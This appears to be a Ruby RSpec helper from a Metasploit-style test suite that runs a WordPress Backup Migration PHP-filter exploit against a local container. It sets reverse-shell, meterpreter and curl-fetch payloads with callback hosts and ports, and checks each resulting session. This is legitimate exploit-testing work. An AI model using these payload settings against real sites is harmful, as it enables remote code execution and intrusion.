# frozen_string_literal: true

require_relative '../rsync_creds/native'
require_relative '../wp_batch_desync_rce/native'

# Independent vendor controls plus existing callback/session utilities.
module BackupMigrationTarget
  include RsyncCredentialTarget
  include WordpressBatchChainTarget

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'backup-migration.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def chain_save
    rc_save
  end

  def rc_resource_roles
    %w[app db]
  end

  def rc_owner
    'exploit/multi/http/wp_backup_migration_php_filter'
  end

  def bm_native(phase)
    directory = File.join(target_runtime.fetch('artifacts'), 'native-' + phase)
    FileUtils.mkdir_p(directory)
    runtime = { directory: directory, compose: target_runtime.fetch('compose'), port: target_endpoint('app').fetch('port'), release: @release, prefix: @prefix, stamp: "#{Process.pid}-#{phase}" }
    path = File.join(directory, 'runtime.json')
    File.write(path, JSON.pretty_generate(runtime))
    output, error, status = Open3.capture3('python3', 'test/module_targets/backup_migration/native_control.py', path)
    File.write(File.join(directory, 'process.stdout'), output)
    File.write(File.join(directory, 'process.stderr'), error)
    expect(status.success?).to be(true), error
    data = JSON.parse(File.read(File.join(directory, 'native-proof.json')))
    @rc.fetch(:native) << { phase: phase, data: data }
    expect(data.fetch('native_passed')).to be(true)
    expect(data.fetch('cases')).to all(include('passed' => true))
    rc_resources(phase)
    rc_save
  end

  def bm_port
    server = TCPServer.new(@callback.fetch(:bind), 0)
    server.local_address.ip_port
  ensure
    server&.close
  end

  def bm_options
    { 'TARGETURI' => @prefix + '/', 'AutoCheck' => true, 'HttpClientTimeout' => 5, 'WfsDelay' => 10 }
  end

  def bm_call(label, options, action: 'run -z', reuse: false)
    record = { label: label, options: options, action: action }
    @rc.fetch(:calls) << record
    run_target_module(rc_owner, 'app', bm_options.merge(options), action: action, allow_errors: true, command_timeout: 120, reuse_module: reuse) do |output|
      record[:output_base64] = Base64.strict_encode64(output.b)
      record[:configuration_id] = rc_json('active_module.object_id')
      rc_save
    end
  end

  def bm_file(path)
    code = '$p=' + path.to_json + ';$s=file_exists($p)?stat($p):false;echo json_encode(["exists"=>(bool)$s,"uid"=>$s?$s["uid"]:null,"base64"=>$s?base64_encode(file_get_contents($p)):null]);'
    output, = rc_command('inspect-proof', 'app', 'php', '-r', code)
    JSON.parse(output)
  end

  def bm_close
    return unless @observer

    requested = rc_json('begin;ids=framework.sessions.keys;ids.each{|id|DruidSessionControl.exit_remote(framework,id)};{requested:ids};end').fetch('requested')
    children = @rc.fetch(:sessions).select { |row| requested.include?(row.fetch('id')) && row.fetch(:label).start_with?('shell-', 'fetch-') }
    children.each do |row|
      pid = row.fetch(:proof).fetch('pid')
      rc_poll(15) { rc_command('remote-child-exited-before-deregister', 'app', 'test', '!', '-d', '/proc/' + pid.to_s, required: false).last.zero? }
    end
    # An idle command-shell registration can outlive its remote process. Verify
    # child exit before closing local registrations; never signal an Apache PID.
    console_command('sessions -K')
    console_command('jobs -K')
    expect(rc_json('{sessions:framework.sessions.keys,jobs:framework.jobs.keys}')).to eq('sessions' => [], 'jobs' => [])
    (@rc[:closures] ||= []) << { requested: requested, remote_children_absent_before_deregister: children.map { |row| row.fetch(:proof).fetch('pid') } }
    rc_save
  end

  def bm_session(label, family, reuse: false)
    payload = { 'php' => 'php/meterpreter_reverse_tcp', 'staged' => 'php/meterpreter/reverse_tcp', 'shell' => 'cmd/unix/reverse_bash', 'fetch' => 'cmd/linux/http/x64/meterpreter/reverse_tcp' }.fetch(family)
    options = { 'TARGET' => %w[php staged].include?(family) ? 0 : 1, 'PAYLOAD' => payload, 'LHOST' => @callback.fetch(:host), 'LPORT' => bm_port, 'ReverseListenerBindAddress' => @callback.fetch(:bind), 'DisablePayloadHandler' => false, 'AutoCheck' => !reuse }
    if %w[php staged].include?(family)
      options.merge!('EXTENSIONS' => 'stdapi', 'AutoVerifySessionTimeout' => 10, 'SessionCommunicationTimeout' => 15, 'SessionExpirationTimeout' => 90)
    elsif family == 'fetch'
      fetched = "/tmp/module-target-backup-fetch-#{Process.pid}-#{label}"
      options.merge!('FETCH_COMMAND' => 'CURL', 'FETCH_SRVHOST' => @callback.fetch(:host), 'FETCH_SRVPORT' => bm_port, 'FetchListenerBindAddress' => @callback.fetch(:bind), 'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_FILENAME' => File.basename(fetched), 'FETCH_DELETE' => true)
    end
    before = rc_json('framework.sessions.keys')
    expect(before).to eq([])
    output = bm_call(label, options, reuse: reuse)
    expect(output).not_to include('Exploit failed', 'Exploit aborted', 'no session was created', 'Unknown datastore option')
    if reuse
      expect(output).not_to include('Running automatic check')
    else
      expect(output).to include('Running automatic check')
    end
    expected_type = family == 'shell' ? 'shell' : 'meterpreter'
    identifier = rc_poll(30) do
      rows = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,owner:s.via_exploit,payload:s.via_payload,klass:s.class.name}}')
      events = File.readlines(@observer.fetch('ready_event_path')).map { |line| JSON.parse(line) }
      rows.find { |row| row.fetch('type') == expected_type && events.any? { |event| event.fetch('id') == row.fetch('id') } }
    end
    expect(identifier.values_at('owner', 'payload')).to eq([rc_owner, 'payload/' + payload])
    sid = identifier.fetch('id')
    proof = "/tmp/module-target-druid-session-#{Process.pid}_#{sid}-#{sid}"
    expect(bm_file(proof).fetch('exists')).to be(false)
    if family == 'shell'
      result = rc_json("DruidSessionControl.proof(framework,#{sid},#{proof.inspect})")
      expected = 'druid-session'
    else
      channels = rc_json("framework.sessions.fetch(#{sid}).channels.keys.sort")
      result = rc_json("begin;s=framework.sessions.fetch(#{sid});f=nil;begin;f=s.fs.file.new(#{proof.inspect},'wb');f.write('backup-session');ensure;f.close if f;end;{pid:s.sys.process.getpid,identity:s.sys.config.getuid,platform:s.platform};end")
      expect(rc_json("framework.sessions.fetch(#{sid}).channels.keys.sort")).to eq(channels)
      expected = 'backup-session'
    end
    expect(bm_file(proof)).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64(expected))
    process, = rc_command('session-native-uid', 'app', 'php', '-r', 'echo file_get_contents("/proc/".$argv[1]."/status");', result.fetch('pid').to_s)
    expect(process).to match(/^Uid:\s+33\s+33\s+33\s+33$/)
    @rc.fetch(:sessions) << { label: label, **identifier, proof: result, file: bm_file(proof) }
    rc_save
  ensure
    rc_command('remove-proof', 'app', 'rm', '-f', proof) if proof
    expect(bm_file(proof).fetch('exists')).to be(false) if proof
    bm_close
    if result && %w[shell fetch].include?(family)
      rc_poll(15) { rc_command('child-exited', 'app', 'test', '!', '-d', '/proc/' + result.fetch('pid').to_s, required: false).last.zero? }
    end
    # The fetch adapter intentionally waits 3-7 seconds before removing its file.
    rc_poll(15) { !bm_file(fetched).fetch('exists') } if fetched
    rc_resources(label)
    rc_save
  end
end
